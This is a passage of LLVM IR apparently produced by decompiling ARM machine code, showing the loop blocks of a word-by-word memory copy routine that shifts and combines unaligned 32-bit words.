  %v0_15230 = load i32, i32* %r2.global-to-local, align 4
  %v2_15230 = add i32 %v0_15230, -16
  store i32 %v2_15230, i32* %r2.global-to-local, align 4
  %v6_15234 = icmp slt i32 %v0_15230, 16
  br i1 %v6_15234, label %dec_label_pc_15238, label %dec_label_pc_15208.dec_label_pc_15208_crit_edge

dec_label_pc_15208.dec_label_pc_15208_crit_edge:  ; preds = %dec_label_pc_15208
  %v0_15208.pre = load i32, i32* @lr, align 4
  %v0_1520c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15208

dec_label_pc_15238:                               ; preds = %dec_label_pc_15208
  %v2_15238 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15238, i32* @r4, align 4
  %v5_15238 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15238, i32* @r5, align 4
  %v2_1523c = add i32 %v0_15230, -4
  store i32 %v2_1523c, i32* %r2.global-to-local, align 4
  %v4_1523c = add i32 %v0_15230, 2147483632
  %v5_1523c = and i32 %v2_1523c, %v4_1523c
  %v6_1523c = icmp slt i32 %v5_1523c, 0
  store i1 %v6_1523c, i1* %cpsr_v.global-to-local, align 1
  %v7_1523c = icmp slt i32 %v2_1523c, 0
  store i1 %v7_1523c, i1* %cpsr_n.global-to-local, align 1
  %v8_1523c = icmp eq i32 %v2_1523c, 0
  store i1 %v8_1523c, i1* %cpsr_z.global-to-local, align 1
  %v5_15240 = icmp slt i32 %v2_15230, -12
  br i1 %v5_15240, label %dec_label_pc_1525c, label %dec_label_pc_15244

dec_label_pc_15244:                               ; preds = %dec_label_pc_15238, %dec_label_pc_151f8, %dec_label_pc_15244
  %v1_15250 = phi i32 [ %v4_15250, %dec_label_pc_15244 ], [ %v12_1522c, %dec_label_pc_15238 ], [ %v0_1522c74, %dec_label_pc_151f8 ]
  %v0_15244 = load i32, i32* @lr, align 4
  %v3_15244 = udiv i32 %v0_15244, 256
  store i32 %v3_15244, i32* %ip.global-to-local, align 4
  %v0_15248 = load i32, i32* %r1.global-to-local, align 4
  %v1_15248 = inttoptr i32 %v0_15248 to i32*
  %v2_15248 = load i32, i32* %v1_15248, align 4
  store i32 %v2_15248, i32* @lr, align 4
  %v4_15248 = add i32 %v0_15248, 4
  store i32 %v4_15248, i32* %r1.global-to-local, align 4
  %v4_1524c = mul i32 %v2_15248, 16777216
  %v5_1524c = or i32 %v4_1524c, %v3_15244
  store i32 %v5_1524c, i32* @ip, align 4
  %v2_15250 = inttoptr i32 %v1_15250 to i32*
  store i32 %v5_1524c, i32* %v2_15250, align 4
  %v3_15250 = load i32, i32* @r0, align 4
  %v4_15250 = add i32 %v3_15250, 4
  store i32 %v4_15250, i32* @r0, align 4
  %v0_15254 = load i32, i32* %r2.global-to-local, align 4
  %v2_15254 = add i32 %v0_15254, -4
  store i32 %v2_15254, i32* %r2.global-to-local, align 4
  %v6_15258 = icmp slt i32 %v0_15254, 4
  br i1 %v6_15258, label %dec_label_pc_1525c.loopexit, label %dec_label_pc_15244

dec_label_pc_1525c.loopexit:                      ; preds = %dec_label_pc_15244
  %v4_15254 = sub i32 3, %v0_15254
  %v5_15254 = and i32 %v4_15254, %v0_15254
  %v6_15254 = icmp slt i32 %v5_15254, 0
  %v7_15254 = icmp slt i32 %v2_15254, 0
  store i1 %v6_15254, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15254, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1525c

dec_label_pc_1525c:                               ; preds = %dec_label_pc_1525c.loopexit, %dec_label_pc_15238
  %v2_1519c111 = phi i32 [ %v4_15250, %dec_label_pc_1525c.loopexit ], [ %v12_1522c, %dec_label_pc_15238 ]
  %v0_1518c107 = phi i32 [ %v2_15254, %dec_label_pc_1525c.loopexit ], [ %v2_1523c, %dec_label_pc_15238 ]
  %v0_1525c = load i32, i32* %r1.global-to-local, align 4
  %v1_1525c = add i32 %v0_1525c, -3
  store i32 %v1_1525c, i32* @r1, align 4
  br label %bb131

dec_label_pc_15264:                               ; preds = %dec_label_pc_151e4
  br i1 %v5_152d4, label %dec_label_pc_152b0, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15264
  store i32 %v2_152d0, i32* %r2.global-to-local, align 4
  %v3_15270 = load i32, i32* @r4, align 4
  store i32 %v3_15270, i32* %stack_var_-16, align 4
  %v6_15270 = load i32, i32* @r5, align 4
  store i32 %v6_15270, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %dec_label_pc_15274.dec_label_pc_15274_crit_edge, %dec_label_pc_1526c
  %v0_15298 = phi i32 [ %v12_15298, %dec_label_pc_15274.dec_label_pc_15274_crit_edge ], [ %v0_1522c74, %dec_label_pc_1526c ]
  %v0_15278 = phi i32 [ %v0_15278.pre, %dec_label_pc_15274.dec_label_pc_15274_crit_edge ], [ %v4_151e8, %dec_label_pc_1526c ]
  %v0_15274 = phi i32 [ %v0_15274.pre, %dec_label_pc_15274.dec_label_pc_15274_crit_edge ], [ %v2_151e8, %dec_label_pc_1526c ]
  %v3_15274 = udiv i32 %v0_15274, 65536
  store i32 %v3_15274, i32* %r3.global-to-local, align 4
  %v1_15278 = inttoptr i32 %v0_15278 to i32*
  %v2_15278 = load i32, i32* %v1_15278, align 4
  store i32 %v2_15278, i32* %r4.global-to-local, align 4
  %v3_15278 = add i32 %v0_15278, 4
  %v4_15278 = inttoptr i32 %v3_15278 to i32*
  %v5_15278 = load i32, i32* %v4_15278, align 4
  store i32 %v5_15278, i32* %r5.global-to-local, align 4
  %v6_15278 = add i32 %v0_15278, 8
  %v7_15278 = inttoptr i32 %v6_15278 to i32*
  %v8_15278 = load i32, i32* %v7_15278, align 4
  store i32 %v8_15278, i32* %ip.global-to-local, align 4
  %v9_15278 = add i32 %v0_15278, 12
  %v10_15278 = inttoptr i32 %v9_15278 to i32*
  %v11_15278 = load i32, i32* %v10_15278, align 4
  store i32 %v11_15278, i32* @lr, align 4
  %v12_15278 = add i32 %v0_15278, 16
  store i32 %v12_15278, i32* %r1.global-to-local, align 4
  %v4_1527c = mul i32 %v2_15278, 65536
  %v5_1527c = or i32 %v4_1527c, %v3_15274
  store i32 %v5_1527c, i32* %r3.global-to-local, align 4
  %v3_15280 = udiv i32 %v2_15278, 65536
  %v4_15284 = mul i32 %v5_15278, 65536
  %v5_15284 = or i32 %v4_15284, %v3_15280
  store i32 %v5_15284, i32* %r4.global-to-local, align 4
  %v3_15288 = udiv i32 %v5_15278, 65536
  %v4_1528c = mul i32 %v8_15278, 65536
  %v5_1528c = or i32 %v4_1528c, %v3_15288
  store i32 %v5_1528c, i32* %r5.global-to-local, align 4
  %v3_15290 = udiv i32 %v8_15278, 65536
  %v4_15294 = mul i32 %v11_15278, 65536
  %v5_15294 = or i32 %v4_15294, %v3_15290
  store i32 %v5_15294, i32* @ip, align 4
  %v1_15298 = inttoptr i32 %v0_15298 to i32*
  store i32 %v5_1527c, i32* %v1_15298, align 4
  %v3_15298 = add i32 %v0_15298, 4
  %v4_15298 = inttoptr i32 %v3_15298 to i32*
  %v5_15298 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15298, i32* %v4_15298, align 4
  %v6_15298 = add i32 %v0_15298, 8
  %v7_15298 = inttoptr i32 %v6_15298 to i32*
  %v8_15298 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15298, i32* %v7_15298, align 4
  %v9_15298 = add i32 %v0_15298, 12
  %v10_15298 = inttoptr i32 %v9_15298 to i32*
  %v11_15298 = load i32, i32* @ip, align 4
  store i32 %v11_15298, i32* %v10_15298, align 4
  %v12_15298 = add i32 %v0_15298, 16
  store i32 %v12_15298, i32* @r0, align 4
  %v0_1529c = load i32, i32* %r2.global-to-local, align 4
  %v2_1529c = add i32 %v0_1529c, -16
  store i32 %v2_1529c, i32* %r2.global-to-local, align 4
  %v6_152a0 = icmp slt i32 %v0_1529c, 16
  br i1 %v6_152a0, label %dec_label_pc_152a4, label %dec_label_pc_15274.dec_label_pc_15274_crit_edge

dec_label_pc_15274.dec_label_pc_15274_crit_edge:  ; preds = %dec_label_pc_15274
  %v0_15274.pre = load i32, i32* @lr, align 4
  %v0_15278.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15274

dec_label_pc_152a4:                               ; preds = %dec_label_pc_15274
  %v2_152a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_152a4, i32* @r4, align 4
  %v5_152a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_152a4, i32* @r5, align 4
  %v2_152a8 = add i32 %v0_1529c, -4
  store i32 %v2_152a8, i32* %r2.global-to-local, align 4
  %v4_152a8 = add i32 %v0_1529c, 2147483632
  %v5_152a8 = and i32 %v2_152a8, %v4_152a8
  %v6_152a8 = icmp slt i32 %v5_152a8, 0
  store i1 %v6_152a8, i1* %cpsr_v.global-to-local, align 1
  %v7_152a8 = icmp slt i32 %v2_152a8, 0
  store i1 %v7_152a8, i1* %cpsr_n.global-to-local, align 1
  %v8_152a8 = icmp eq i32 %v2_152a8, 0
  store i1 %v8_152a8, i1* %cpsr_z.global-to-local, align 1
  %v5_152ac = icmp slt i32 %v2_1529c, -12
  br i1 %v5_152ac, label %dec_label_pc_152c8, label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %dec_label_pc_152a4, %dec_label_pc_15264, %dec_label_pc_152b0
  %v1_152bc = phi i32 [ %v4_152bc, %dec_label_pc_152b0 ], [ %v12_15298, %dec_label_pc_152a4 ], [ %v0_1522c74, %dec_label_pc_15264 ]
  %v0_152b0 = load i32, i32* @lr, align 4
  %v3_152b0 = udiv i32 %v0_152b0, 65536
  store i32 %v3_152b0, i32* %ip.global-to-local, align 4
  %v0_152b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_152b4 = inttoptr i32 %v0_152b4 to i32*
  %v2_152b4 = load i32, i32* %v1_152b4, align 4
  store i32 %v2_152b4, i32* @lr, align 4
  %v4_152b4 = add i32 %v0_152b4, 4
  store i32 %v4_152b4, i32* %r1.global-to-local, align 4
  %v4_152b8 = mul i32 %v2_152b4, 65536
  %v5_152b8 = or i32 %v4_152b8, %v3_152b0
  store i32 %v5_152b8, i32* @ip, align 4
  %v2_152bc = inttoptr i32 %v1_152bc to i32*
  store i32 %v5_152b8, i32* %v2_152bc, align 4
  %v3_152bc = load i32, i32* @r0, align 4
  %v4_152bc = add i32 %v3_152bc, 4
  store i32 %v4_152bc, i32* @r0, align 4
  %v0_152c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_152c0 = add i32 %v0_152c0, -4
  store i32 %v2_152c0, i32* %r2.global-to-local, align 4
  %v6_152c4 = icmp slt i32 %v0_152c0, 4
  br i1 %v6_152c4, label %dec_label_pc_152c8.loopexit, label %dec_label_pc_152b0

dec_label_pc_152c8.loopexit:                      ; preds = %dec_label_pc_152b0
  %v4_152c0 = sub i32 3, %v0_152c0
  %v5_152c0 = and i32 %v4_152c0, %v0_152c0
  %v6_152c0 = icmp slt i32 %v5_152c0, 0
  %v7_152c0 = icmp slt i32 %v2_152c0, 0
  store i1 %v6_152c0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_152c0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152c8.loopexit, %dec_label_pc_152a4
  %v2_1519c112 = phi i32 [ %v4_152bc, %dec_label_pc_152c8.loopexit ], [ %v12_15298, %dec_label_pc_152a4 ]
  %v0_1518c108 = phi i32 [ %v2_152c0, %dec_label_pc_152c8.loopexit ], [ %v2_152a8, %dec_label_pc_152a4 ]
  %v0_152c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_152c8 = add i32 %v0_152c8, -2
  store i32 %v1_152c8, i32* @r1, align 4
  br label %bb131

dec_label_pc_152d0:                               ; preds = %dec_label_pc_151e4
  br i1 %v5_152d4, label %dec_label_pc_1531c, label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152d0
  store i32 %v2_152d0, i32* %r2.global-to-local, align 4
  %v3_152dc = load i32, i32* @r4, align 4
  store i32 %v3_152dc, i32* %stack_var_-16, align 4
  %v6_152dc = load i32, i32* @r5, align 4
  store i32 %v6_152dc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152e0.dec_label_pc_152e0_crit_edge, %dec_label_pc_152d8
  %v0_15304 = phi i32 [ %v12_15304, %dec_label_pc_152e0.dec_label_pc_152e0_crit_edge ], [ %v0_1522c74, %dec_label_pc_152d8 ]
  %v0_152e4 = phi i32 [ %v0_152e4.pre, %dec_label_pc_152e0.dec_label_pc_152e0_crit_edge ], [ %v4_151e8, %dec_label_pc_152d8 ]
  %v0_152e0 = phi i32 [ %v0_152e0.pre, %dec_label_pc_152e0.dec_label_pc_152e0_crit_edge ], [ %v2_151e8, %dec_label_pc_152d8 ]
  %v3_152e0 = udiv i32 %v0_152e0, 16777216
  store i32 %v3_152e0, i32* %r3.global-to-local, align 4
  %v1_152e4 = inttoptr i32 %v0_152e4 to i32*
  %v2_152e4 = load i32, i32* %v1_152e4, align 4
  store i32 %v2_152e4, i32* %r4.global-to-local, align 4
  %v3_152e4 = add i32 %v0_152e4, 4
  %v4_152e4 = inttoptr i32 %v3_152e4 to i32*
  %v5_152e4 = load i32, i32* %v4_152e4, align 4
  store i32 %v5_152e4, i32* %r5.global-to-local, align 4
  %v6_152e4 = add i32 %v0_152e4, 8
  %v7_152e4 = inttoptr i32 %v6_152e4 to i32*
  %v8_152e4 = load i32, i32* %v7_152e4, align 4
  store i32 %v8_152e4, i32* %ip.global-to-local, align 4
  %v9_152e4 = add i32 %v0_152e4, 12
  %v10_152e4 = inttoptr i32 %v9_152e4 to i32*
  %v11_152e4 = load i32, i32* %v10_152e4, align 4
  store i32 %v11_152e4, i32* @lr, align 4
  %v12_152e4 = add i32 %v0_152e4, 16
  store i32 %v12_152e4, i32* %r1.global-to-local, align 4
  %v4_152e8 = mul i32 %v2_152e4, 256
  %v5_152e8 = or i32 %v4_152e8, %v3_152e0
  store i32 %v5_152e8, i32* %r3.global-to-local, align 4
  %v3_152ec = udiv i32 %v2_152e4, 16777216
  %v4_152f0 = mul i32 %v5_152e4, 256
  %v5_152f0 = or i32 %v4_152f0, %v3_152ec
  store i32 %v5_152f0, i32* %r4.global-to-local, align 4
  %v3_152f4 = udiv i32 %v5_152e4, 16777216
  %v4_152f8 = mul i32 %v8_152e4, 256
  %v5_152f8 = or i32 %v4_152f8, %v3_152f4
  store i32 %v5_152f8, i32* %r5.global-to-local, align 4
  %v3_152fc = udiv i32 %v8_152e4, 16777216
  %v4_15300 = mul i32 %v11_152e4, 256
  %v5_15300 = or i32 %v4_15300, %v3_152fc
  store i32 %v5_15300, i32* @ip, align 4
  %v1_15304 = inttoptr i32 %v0_15304 to i32*
  store i32 %v5_152e8, i32* %v1_15304, align 4
  %v3_15304 = add i32 %v0_15304, 4
  %v4_15304 = inttoptr i32 %v3_15304 to i32*
  %v5_15304 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15304, i32* %v4_15304, align 4
  %v6_15304 = add i32 %v0_15304, 8
  %v7_15304 = inttoptr i32 %v6_15304 to i32*
  %v8_15304 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15304, i32* %v7_15304, align 4
  %v9_15304 = add i32 %v0_15304, 12
  %v10_15304 = inttoptr i32 %v9_15304 to i32*
  %v11_15304 = load i32, i32* @ip, align 4
  store i32 %v11_15304, i32* %v10_15304, align 4
  %v12_15304 = add i32 %v0_15304, 16
  store i32 %v12_15304, i32* @r0, align 4
  %v0_15308 = load i32, i32* %r2.global-to-local, align 4
  %v2_15308 = add i32 %v0_15308, -16
  store i32 %v2_15308, i32* %r2.global-to-local, align 4
  %v6_1530c = icmp slt i32 %v0_15308, 16
  br i1 %v6_1530c, label %dec_label_pc_15310, label %dec_label_pc_152e0.dec_label_pc_152e0_crit_edge

dec_label_pc_152e0.dec_label_pc_152e0_crit_edge:  ; preds = %dec_label_pc_152e0
  %v0_152e0.pre = load i32, i32* @lr, align 4
  %v0_152e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152e0

dec_label_pc_15310:                               ; preds = %dec_label_pc_152e0
  %v2_15310 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15310, i32* @r4, align 4
  %v5_15310 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15310, i32* @r5, align 4
  %v2_15314 = add i32 %v0_15308, -4
  store i32 %v2_15314, i32* %r2.global-to-local, align 4
  %v4_15314 = add i32 %v0_15308, 2147483632
  %v5_15314 = and i32 %v2_15314, %v4_15314
  %v6_15314 = icmp slt i32 %v5_15314, 0
  store i1 %v6_15314, i1* %cpsr_v.global-to-local, align 1
  %v7_15314 = icmp slt i32 %v2_15314, 0
  store i1 %v7_15314, i1* %cpsr_n.global-to-local, align 1
  %v8_15314 = icmp eq i32 %v2_15314, 0
  store i1 %v8_15314, i1* %cpsr_z.global-to-local, align 1
  %v5_15318 = icmp slt i32 %v2_15308, -12
  br i1 %v5_15318, label %dec_label_pc_15334, label %dec_label_pc_1531c

dec_label_pc_1531c:                               ; preds = %dec_label_pc_15310, %dec_label_pc_152d0, %dec_label_pc_1531c
  %v1_15328 = phi i32 [ %v4_15328, %dec_label_pc_1531c ], [ %v12_15304, %dec_label_pc_15310 ], [ %v0_1522c74, %dec_label_pc_152d0 ]
  %v0_1531c = load i32, i32* @lr, align 4
  %v3_1531c = udiv i32 %v0_1531c, 16777216
  store i32 %v3_1531c, i32* %ip.global-to-local, align 4
  %v0_15320 = load i32, i32* %r1.global-to-local, align 4
  %v1_15320 = inttoptr i32 %v0_15320 to i32*
  %v2_15320 = load i32, i32* %v1_15320, align 4
  store i32 %v2_15320, i32* @lr, align 4
  %v4_15320 = add i32 %v0_15320, 4
  store i32 %v4_15320, i32* %r1.global-to-local, align 4
  %v4_15324 = mul i32 %v2_15320, 256
  %v5_15324 = or i32 %v4_15324, %v3_1531c
  store i32 %v5_15324, i32* @ip, align 4
  %v2_15328 = inttoptr i32 %v1_15328 to i32*
  store i32 %v5_15324, i32* %v2_15328, align 4
  %v3_15328 = load i32, i32* @r0, align 4
  %v4_15328 = add i32 %v3_15328, 4
  store i32 %v4_15328, i32* @r0, align 4
  %v0_1532c = load i32, i32* %r2.global-to-local, align 4
  %v2_1532c = add i32 %v0_1532c, -4
  store i32 %v2_1532c, i32* %r2.global-to-local, align 4
  %v6_15330 = icmp slt i32 %v0_1532c, 4
  br i1 %v6_15330, label %dec_label_pc_15334.loopexit, label %dec_label_pc_1531c

dec_label_pc_15334.loopexit:                      ; preds = %dec_label_pc_1531c
  %v4_1532c = sub i32 3, %v0_1532c
  %v5_1532c = and i32 %v4_1532c, %v0_1532c
  %v6_1532c = icmp slt i32 %v5_1532c, 0
  %v7_1532c = icmp slt i32 %v2_1532c, 0
  store i1 %v6_1532c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1532c, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_15334.loopexit, %dec_label_pc_15310
  %v2_1519c113 = phi i32 [ %v4_15328, %dec_label_pc_15334.loopexit ], [ %v12_15304, %dec_label_pc_15310 ]
  %v0_1518c109 = phi i32 [ %v2_1532c, %dec_label_pc_15334.loopexit ], [ %v2_15314, %dec_label_pc_15310 ]
  %v0_15334 = load i32, i32* %r1.global-to-local, align 4
  %v1_15334 = add i32 %v0_15334, -1
  store i32 %v1_15334, i32* @r1, align 4
  br label %bb131

dec_label_pc_1533c:                               ; preds = %dec_label_pc_150f0
  %v1_1533c = load i32, i32* @r2, align 4
  %v2_1533c = add i32 %v1_1533c, %v0_150f0
  store i32 %v2_1533c, i32* %r1.global-to-local, align 4
  %v2_15340 = add i32 %v1_1533c, %v1_150f0
  store i32 %v2_15340, i32* %r0.global-to-local, align 4
  %v2_15344 = add i32 %v1_1533c, -4
  store i32 %v2_15344, i32* %r2.global-to-local, align 4
  %v4_15344 = sub i32 3, %v1_1533c
  %v5_15344 = and i32 %v4_15344, %v1_1533c
  %v6_15344 = icmp slt i32 %v5_15344, 0
  store i1 %v6_15344, i1* %cpsr_v.global-to-local, align 1
  %v7_15344 = icmp slt i32 %v2_15344, 0
  store i1 %v7_15344, i1* %cpsr_n.global-to-local, align 1
  %v8_15344 = icmp eq i32 %v1_1533c, 4
  store i1 %v8_15344, i1* %cpsr_z.global-to-local, align 1
  %v5_15348 = icmp slt i32 %v1_1533c, 4
  br i1 %v5_15348, label %bb141, label %dec_label_pc_1534c

dec_label_pc_1534c:                               ; preds = %dec_label_pc_1533c
  %v1_1534c = urem i32 %v2_15340, 4
  store i32 %v1_1534c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1534c = icmp eq i32 %v1_1534c, 0
  store i1 %v2_1534c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1534c, label %dec_label_pc_15354, label %dec_label_pc_153f4

dec_label_pc_15354:                               ; preds = %dec_label_pc_1534c
  %v1_15354 = urem i32 %v2_1533c, 4
  store i32 %v1_15354, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15354 = icmp eq i32 %v1_15354, 0
  store i1 %v2_15354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15354, label %dec_label_pc_1535c, label %dec_label_pc_15420

dec_label_pc_1535c:                               ; preds = %dec_label_pc_15354, %dec_label_pc_15418
  %v0_1537448 = phi i32 [ %v2_15340, %dec_label_pc_15354 ], [ %v0_1546831, %dec_label_pc_15418 ]
  %v0_1537047 = phi i32 [ %v2_1533c, %dec_label_pc_15354 ], [ %v0_15418, %dec_label_pc_15418 ]
  %v0_1535c = phi i32 [ %v2_15344, %dec_label_pc_15354 ], [ %v2_15410, %dec_label_pc_15418 ]
  %v2_1535c = add i32 %v0_1535c, -8
  store i32 %v2_1535c, i32* %r2.global-to-local, align 4
  %v4_1535c = sub i32 7, %v0_1535c
  %v5_1535c = and i32 %v4_1535c, %v0_1535c
  %v6_1535c = icmp slt i32 %v5_1535c, 0
  store i1 %v6_1535c, i1* %cpsr_v.global-to-local, align 1
  %v7_1535c = icmp slt i32 %v2_1535c, 0
  store i1 %v7_1535c, i1* %cpsr_n.global-to-local, align 1
  %v8_1535c = icmp eq i32 %v0_1535c, 8
  store i1 %v8_1535c, i1* %cpsr_z.global-to-local, align 1
  %v5_15360 = icmp slt i32 %v0_1535c, 8
  br i1 %v5_15360, label %dec_label_pc_153ac, label %dec_label_pc_15364

dec_label_pc_15364:                               ; preds = %dec_label_pc_1535c
  %v3_15364 = load i32, i32* @r4, align 4
  store i32 %v3_15364, i32* %stack_var_-8, align 4
  %v6_15364 = load i32, i32* @lr, align 4
  %v2_15368 = add i32 %v0_1535c, -28
  store i32 %v2_15368, i32* %r2.global-to-local, align 4
  %v4_15368 = sub i32 27, %v0_1535c
  %v5_15368 = and i32 %v4_15368, %v2_1535c
  %v6_15368 = icmp slt i32 %v5_15368, 0
  store i1 %v6_15368, i1* %cpsr_v.global-to-local, align 1
  %v7_15368 = icmp slt i32 %v2_15368, 0
  store i1 %v7_15368, i1* %cpsr_n.global-to-local, align 1
  %v8_15368 = icmp eq i32 %v2_1535c, 20
  store i1 %v8_15368, i1* %cpsr_z.global-to-local, align 1
  %v5_1536c = icmp slt i32 %v2_1535c, 20
  br i1 %v5_1536c, label %dec_label_pc_15388, label %dec_label_pc_15370

dec_label_pc_15370:                               ; preds = %dec_label_pc_15364, %dec_label_pc_15370.dec_label_pc_15370_crit_edge
  %v0_15374 = phi i32 [ %v1_1537c, %dec_label_pc_15370.dec_label_pc_15370_crit_edge ], [ %v0_1537448, %dec_label_pc_15364 ]
  %v0_15370 = phi i32 [ %v0_15370.pre, %dec_label_pc_15370.dec_label_pc_15370_crit_edge ], [ %v0_1537047, %dec_label_pc_15364 ]
  %v1_15370 = add i32 %v0_15370, -4
  %v2_15370 = inttoptr i32 %v1_15370 to i32*
  %v3_15370 = load i32, i32* %v2_15370, align 4
  store i32 %v3_15370, i32* %r3.global-to-local, align 4
  %v4_15370 = add i32 %v0_15370, -8
  %v5_15370 = inttoptr i32 %v4_15370 to i32*
  %v6_15370 = load i32, i32* %v5_15370, align 4
  store i32 %v6_15370, i32* %r4.global-to-local, align 4
  %v7_15370 = add i32 %v0_15370, -12
  %v8_15370 = inttoptr i32 %v7_15370 to i32*
  %v9_15370 = load i32, i32* %v8_15370, align 4
  store i32 %v9_15370, i32* %ip.global-to-local, align 4
  %v10_15370 = add i32 %v0_15370, -16
  %v11_15370 = inttoptr i32 %v10_15370 to i32*
  %v12_15370 = load i32, i32* %v11_15370, align 4
  store i32 %v12_15370, i32* %lr.global-to-local, align 4
  store i32 %v10_15370, i32* %r1.global-to-local, align 4
  %v1_15374 = add i32 %v0_15374, -16
  %v2_15374 = inttoptr i32 %v1_15374 to i32*
  store i32 %v3_15370, i32* %v2_15374, align 4
  %v4_15374 = add i32 %v0_15374, -12
  %v5_15374 = inttoptr i32 %v4_15374 to i32*
  %v6_15374 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15374, i32* %v5_15374, align 4
  %v7_15374 = add i32 %v0_15374, -8
  %v8_15374 = inttoptr i32 %v7_15374 to i32*
  %v9_15374 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15374, i32* %v8_15374, align 4
  %v10_15374 = add i32 %v0_15374, -4
  %v11_15374 = inttoptr i32 %v10_15374 to i32*
  %v12_15374 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15374, i32* %v11_15374, align 4
  store i32 %v1_15374, i32* %r0.global-to-local, align 4
  %v0_15378 = load i32, i32* %r1.global-to-local, align 4
  %v1_15378 = add i32 %v0_15378, -4
  %v2_15378 = inttoptr i32 %v1_15378 to i32*
  %v3_15378 = load i32, i32* %v2_15378, align 4
  store i32 %v3_15378, i32* %r3.global-to-local, align 4
  %v4_15378 = add i32 %v0_15378, -8
  %v5_15378 = inttoptr i32 %v4_15378 to i32*
  %v6_15378 = load i32, i32* %v5_15378, align 4
  store i32 %v6_15378, i32* %r4.global-to-local, align 4
  %v7_15378 = add i32 %v0_15378, -12
  %v8_15378 = inttoptr i32 %v7_15378 to i32*
  %v9_15378 = load i32, i32* %v8_15378, align 4
  store i32 %v9_15378, i32* @ip, align 4
  %v10_15378 = add i32 %v0_15378, -16
  %v11_15378 = inttoptr i32 %v10_15378 to i32*
  %v12_15378 = load i32, i32* %v11_15378, align 4
  store i32 %v12_15378, i32* %lr.global-to-local, align 4
  store i32 %v10_15378, i32* %r1.global-to-local, align 4
  %v1_1537c = add i32 %v0_15374, -32
  %v2_1537c = inttoptr i32 %v1_1537c to i32*
  store i32 %v3_15378, i32* %v2_1537c, align 4
  %v4_1537c = add i32 %v0_15374, -28
  %v5_1537c = inttoptr i32 %v4_1537c to i32*
  %v6_1537c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1537c, i32* %v5_1537c, align 4
  %v7_1537c = add i32 %v0_15374, -24
  %v8_1537c = inttoptr i32 %v7_1537c to i32*
  %v9_1537c = load i32, i32* @ip, align 4
  store i32 %v9_1537c, i32* %v8_1537c, align 4
  %v10_1537c = add i32 %v0_15374, -20
  %v11_1537c = inttoptr i32 %v10_1537c to i32*
  %v12_1537c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1537c, i32* %v11_1537c, align 4
  store i32 %v1_1537c, i32* %r0.global-to-local, align 4
  %v0_15380 = load i32, i32* %r2.global-to-local, align 4
  %v2_15380 = add i32 %v0_15380, -32
  store i32 %v2_15380, i32* %r2.global-to-local, align 4
  %v6_15384 = icmp slt i32 %v0_15380, 32
  br i1 %v6_15384, label %dec_label_pc_15388.loopexit, label %dec_label_pc_15370.dec_label_pc_15370_crit_edge

dec_label_pc_15370.dec_label_pc_15370_crit_edge:  ; preds = %dec_label_pc_15370
  %v0_15370.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15370

dec_label_pc_15388.loopexit:                      ; preds = %dec_label_pc_15370
  %v4_15380 = sub i32 31, %v0_15380
  %v5_15380 = and i32 %v4_15380, %v0_15380
  %v6_15380 = icmp slt i32 %v5_15380, 0
  %v7_15380 = icmp slt i32 %v2_15380, 0
  store i1 %v6_15380, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15380, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15388

dec_label_pc_15388:                               ; preds = %dec_label_pc_15388.loopexit, %dec_label_pc_15364
  %v6_15390 = phi i32 [ %v1_1537c, %dec_label_pc_15388.loopexit ], [ %v0_1537448, %dec_label_pc_15364 ]
  %v0_15398.pr = phi i32 [ %v2_15380, %dec_label_pc_15388.loopexit ], [ %v2_15368, %dec_label_pc_15364 ]
  %v4_15388 = add i32 %v0_15398.pr, 16
  %v6_15388 = sub i32 0, %v0_15398.pr
  %v7_15388 = and i32 %v4_15388, %v6_15388
  %v8_15388 = icmp slt i32 %v7_15388, 0
  store i1 %v8_15388, i1* %cpsr_v.global-to-local, align 1
  %v9_15388 = icmp slt i32 %v4_15388, 0
  store i1 %v9_15388, i1* %cpsr_n.global-to-local, align 1
  %v10_15388 = icmp eq i32 %v4_15388, 0
  store i1 %v10_15388, i1* %cpsr_z.global-to-local, align 1
